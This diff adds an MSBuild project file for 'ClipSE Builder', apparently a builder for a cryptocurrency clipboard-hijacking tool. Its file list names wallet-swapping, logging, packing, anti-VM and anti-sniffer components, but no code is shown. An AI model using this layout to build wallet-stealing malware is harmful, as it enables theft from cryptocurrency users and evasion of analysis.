@@ -1,0 +1,256 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{2095436A-E580-4CFF-B78B-72A2A625C980}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <RootNamespace>ClipPurSEditionBuilder</RootNamespace>
+    <AssemblyName>ClipSE Builder by r3xq1</AssemblyName>
+    <TargetFrameworkVersion>v4.7</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <AutoGenerateBindingRedirects>false</AutoGenerateBindingRedirects>
+    <Deterministic>true</Deterministic>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <Prefer32Bit>false</Prefer32Bit>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ApplicationIcon>Resources\IconBuilder.ico</ApplicationIcon>
+  </PropertyGroup>
+  <PropertyGroup>
+    <StartupObject>ClipPurSEditionBuilder.Program</StartupObject>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="System" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Management" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="Build.cs" />
+    <Compile Include="ClipPurseFrm.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="ClipPurseFrm.Designer.cs">
+      <DependentUpon>ClipPurseFrm.cs</DependentUpon>
+    </Compile>
+    <Compile Include="ControlsSE\BuildSE.cs">
+      <SubType>UserControl</SubType>
+    </Compile>
+    <Compile Include="ControlsSE\BuildSE.Designer.cs">
+      <DependentUpon>BuildSE.cs</DependentUpon>
+    </Compile>
+    <Compile Include="ControlsSE\EmptySE.cs">
+      <SubType>UserControl</SubType>
+    </Compile>
+    <Compile Include="ControlsSE\EmptySE.Designer.cs">
+      <DependentUpon>EmptySE.cs</DependentUpon>
+    </Compile>
+    <Compile Include="ControlsSE\InfoSE.cs">
+      <SubType>UserControl</SubType>
+    </Compile>
+    <Compile Include="ControlsSE\InfoSE.Designer.cs">
+      <DependentUpon>InfoSE.cs</DependentUpon>
+    </Compile>
+    <Compile Include="ControlsSE\LicenSE.cs">
+      <SubType>UserControl</SubType>
+    </Compile>
+    <Compile Include="ControlsSE\LicenSE.Designer.cs">
+      <DependentUpon>LicenSE.cs</DependentUpon>
+    </Compile>
+    <Compile Include="ControlsSE\LoGGeR.cs">
+      <SubType>UserControl</SubType>
+    </Compile>
+    <Compile Include="ControlsSE\LoGGeR.Designer.cs">
+      <DependentUpon>LoGGeR.cs</DependentUpon>
+    </Compile>
+    <Compile Include="ControlsSE\NewWalletSE.cs">
+      <SubType>UserControl</SubType>
+    </Compile>
+    <Compile Include="ControlsSE\NewWalletSE.Designer.cs">
+      <DependentUpon>NewWalletSE.cs</DependentUpon>
+    </Compile>
+    <Compile Include="ControlsSE\UpdateSE.cs">
+      <SubType>UserControl</SubType>
+    </Compile>
+    <Compile Include="ControlsSE\UpdateSE.Designer.cs">
+      <DependentUpon>UpdateSE.cs</DependentUpon>
+    </Compile>
+    <Compile Include="ControlsSE\WalletSE.cs">
+      <SubType>UserControl</SubType>
+    </Compile>
+    <Compile Include="ControlsSE\WalletSE.Designer.cs">
+      <DependentUpon>WalletSE.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Design\GraphBox.cs" />
+    <Compile Include="Design\IPurSEBox.cs" />
+    <Compile Include="Design\PurSEBox.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Include="EncryptKey.cs" />
+    <Compile Include="Enums.cs" />
+    <Compile Include="FileChecker.cs" />
+    <Compile Include="GlobalPath.cs" />
+    <Compile Include="Language\GlobalMessageStrings_en-US.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DesignTime>True</DesignTime>
+      <DependentUpon>GlobalMessageStrings_en-US.resx</DependentUpon>
+    </Compile>
+    <Compile Include="Language\GlobalMessageStrings_ru_RU.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DesignTime>True</DesignTime>
+      <DependentUpon>GlobalMessageStrings_ru_RU.resx</DependentUpon>
+    </Compile>
+    <Compile Include="Mod\Packer.cs" />
+    <Compile Include="Mod\Project.cs" />
+    <Compile Include="Sticks\ProcessControl.cs" />
+    <Compile Include="Translate.cs" />
+    <Compile Include="License\CheckerKeys.cs" />
+    <Compile Include="License\HardwareID.cs" />
+    <Compile Include="NativeMethods.cs" />
+    <Compile Include="Program.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="SourceEdition.cs" />
+    <Compile Include="Sticks\AntiSniffer.cs" />
+    <Compile Include="Sticks\AntiVM.cs" />
+    <Compile Include="Sticks\ControlActive.cs" />
+    <Compile Include="Sticks\FileControl.cs" />
+    <Compile Include="Sticks\GenX.cs" />
+    <Compile Include="Sticks\GetFileSize.cs" />
+    <Compile Include="Sticks\INetConnect.cs" />
+    <Compile Include="Sticks\ManifestLoader.cs" />
+    <Compile Include="Sticks\MusicPlay.cs" />
+    <Compile Include="Sticks\RndShuffle.cs" />
+    <Compile Include="Sticks\RunCheck.cs" />
+    <EmbeddedResource Include="ClipPurseFrm.en-US.resx">
+      <DependentUpon>ClipPurseFrm.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="ClipPurseFrm.resx">
+      <DependentUpon>ClipPurseFrm.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="ControlsSE\BuildSE.en-US.resx">
+      <DependentUpon>BuildSE.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="ControlsSE\BuildSE.resx">
+      <DependentUpon>BuildSE.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="ControlsSE\EmptySE.resx">
+      <DependentUpon>EmptySE.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="ControlsSE\InfoSE.en-US.resx">
+      <DependentUpon>InfoSE.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="ControlsSE\InfoSE.resx">
+      <DependentUpon>InfoSE.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="ControlsSE\LicenSE.en-US.resx">
+      <DependentUpon>LicenSE.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="ControlsSE\LicenSE.resx">
+      <DependentUpon>LicenSE.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="ControlsSE\LoGGeR.en-US.resx">
+      <DependentUpon>LoGGeR.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="ControlsSE\LoGGeR.resx">
+      <DependentUpon>LoGGeR.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="ControlsSE\NewWalletSE.en-US.resx">
+      <DependentUpon>NewWalletSE.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="ControlsSE\NewWalletSE.resx">
+      <DependentUpon>NewWalletSE.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="ControlsSE\UpdateSE.en-US.resx">
+      <DependentUpon>UpdateSE.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="ControlsSE\UpdateSE.resx">
+      <DependentUpon>UpdateSE.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="ControlsSE\WalletSE.en-US.resx">
+      <DependentUpon>WalletSE.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="ControlsSE\WalletSE.resx">
+      <DependentUpon>WalletSE.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Language\GlobalMessageStrings_en-US.resx">
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>GlobalMessageStrings_en-US.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Language\GlobalMessageStrings_ru_RU.resx">
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>GlobalMessageStrings_ru_RU.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Properties\Resources.resx">
+      <Generator>PublicResXFileCodeGenerator</Generator>
+      <LastGenOutput>Resources.Designer.cs</LastGenOutput>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+    <Compile Include="Properties\Resources.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Resources.resx</DependentUpon>
+      <DesignTime>True</DesignTime>
+    </Compile>
+    <None Include="app.config" />
+    <None Include="Properties\Settings.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <LastGenOutput>Settings.Designer.cs</LastGenOutput>
+    </None>
+    <Compile Include="Properties\Settings.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Settings.settings</DependentUpon>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+    <None Include="Resources\App.config" />
+    <None Include="Resources\app.manifest" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\Error_Build.wav" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\GoodBuild.wav" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\Bitcoin.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\Logo.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\Qiwi.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\IconBuilder.ico" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\UpdaterPicture.jpg" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\The_PILE_MEMEME.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\tenor.gif" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
